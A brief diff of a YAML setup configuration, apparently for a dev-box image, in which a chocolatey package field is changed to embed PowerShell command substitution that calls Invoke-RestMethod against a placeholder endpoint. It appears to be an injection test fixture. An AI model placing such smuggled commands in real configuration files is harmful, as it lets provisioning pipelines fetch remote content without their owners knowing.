@@ -9,4 +9,4 @@ supportsHibernation: false
 setupTasks:
   - task: choco
     inputs:
-      package: $(Write-Output "hello")
+      package: $(Invoke-RestMethod -Uri "http://{CUSTOMENDPOINT}/package" -Method Get;)
